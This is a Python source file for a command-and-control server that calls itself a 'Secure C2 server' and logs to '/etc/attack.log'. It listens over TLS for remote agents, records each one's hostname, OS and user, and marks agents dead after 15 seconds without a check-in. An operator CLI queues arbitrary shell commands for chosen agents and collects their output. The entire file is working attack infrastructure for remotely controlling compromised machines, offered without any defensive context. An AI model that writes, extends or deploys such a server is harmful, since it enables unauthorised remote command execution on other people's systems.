import socket
import threading
import json
import os
import ssl
import datetime
import logging

# Configure logging
LOG_FILE = "/etc/attack.log"
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

CERT_PATH = os.path.join(os.path.dirname(__file__), "cert.pem")
KEY_PATH = os.path.join(os.path.dirname(__file__), "key.pem")

DB_FILE = "agents_db.json"
command_queue = {}

# Initial loading of the JSON database
if os.path.exists(DB_FILE):
    with open(DB_FILE, "r") as f:
        agents_db = json.load(f)
else:
    agents_db = {}

# Automatic saving of the database
def save_db():
    with open(DB_FILE, "w") as f:
        json.dump(agents_db, f, indent=4)

def check_dead_agents():
    for agent_id, info in agents_db.items():
        if info.get("status") == "alive":
            if info.get("date") and datetime.datetime.fromisoformat(info["date"]) <= datetime.datetime.now() - datetime.timedelta(seconds=15):  # dead if no check-in for 15 seconds
                info["status"] = "dead"
                logging.warning(f"Agent {agent_id} marked as dead.")
    save_db()

last_results = {}

def handle_agent(conn, addr):
    try:
        data = conn.recv(4096).decode()
        agent_data = json.loads(data)
        agent_id = agent_data.get("id")
        # Case 1: Command result received
        if "result" in agent_data:
            last_results[agent_id] = agent_data["result"]
            logging.info(f"Result from {agent_id}:\n{agent_data['result']}")
            print(f"[+] Result from {agent_id}:\n{agent_data['result']}\n")

        # Case 2: Agent registration
        if agent_id not in agents_db:
            agents_db[agent_id] = {
                "ip": addr[0],
                "hostname": agent_data.get("hostname"),
                "os": agent_data.get("os"),
                "user": agent_data.get("user"),
                "python_version": agent_data.get("python-version"),
                "status": "alive",
            }
            logging.info(f"Agent {agent_id} registered from {addr[0]}")
        elif agents_db[agent_id]["status"] == "dead":
            agents_db[agent_id]["status"] = "alive"
            logging.info(f"Agent {agent_id} marked as active from {addr[0]}")
        agents_db[agent_id]["date"] = datetime.datetime.now().isoformat()
        save_db()
        # Send command if available
        response = {"status": "ok"}
        if agent_id in command_queue:
            response["command"] = command_queue.pop(agent_id)

        conn.sendall(json.dumps(response).encode())
    except (ConnectionResetError, BrokenPipeError):
        logging.warning(f"Client at {addr[0]} disconnected unexpectedly.")
    except json.JSONDecodeError:
        logging.warning(f"Invalid JSON received from {addr[0]} — ignoring.")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
    finally:
        conn.close()

def server_listener(host='0.0.0.0', port=9999):
    if not os.path.exists(CERT_PATH) or not os.path.exists(KEY_PATH):
        logging.error("Missing certificate or key. Please generate an SSL certificate.")
        return
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=CERT_PATH, keyfile=KEY_PATH)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((host, port))
        sock.listen()
        logging.info(f"Secure C2 server listening on {host}:{port}")

        while True:
            client_sock, addr = sock.accept()
            conn = context.wrap_socket(client_sock, server_side=True)
            thread = threading.Thread(target=handle_agent, args=(conn, addr), daemon=True)
            thread.start()

def cli():
    while True:
        cmd = input("C2> ").strip()
        if cmd == "list":
            for aid, info in agents_db.items():
                logging.info(f"Listing agent: ID: {aid}, IP: {info['ip']}, Hostname: {info['hostname']}, OS: {info['os']}, User: {info['user']}, Status: {info['status']}, Last Check-in: {info.get('date', 'N/A')}")
                print(f"- ID: {aid}, IP: {info['ip']}, Hostname: {info['hostname']}, OS: {info['os']}, User: {info['user']}, Status: {info['status']}, Last Check-in: {info.get('date', 'N/A')}")
        elif cmd == "exit":
            logging.info("Stopping the server.")
            print("[*] Stopping the server.")
            break
        elif cmd.startswith("send "):
            parts = cmd.split(" ", 2)
            if len(parts) < 3:
                print("Usage: send <agent_id> <command>")
                continue
            agent_id = parts[1]
            command = parts[2]
            if agent_id in agents_db:
                command_queue[agent_id] = command
                logging.info(f"Command sent to {agent_id}: {command}")
                print(f"[+] Command sent to {agent_id}")
            else:
                logging.warning(f"Agent {agent_id} not found.")
                print("[-] Agent not found")
        elif cmd.startswith("results"):
            for agent_id, output in last_results.items():
                logging.info(f"Result from {agent_id}: {output}")
                print(f"\n[Result from {agent_id}]\n{output}\n")
        else:
            print("Invalid command entered.")
            print("Available commands: list | send | exit")
        check_dead_agents()

if __name__ == "__main__":
    threading.Thread(target=server_listener, daemon=True).start()
    cli()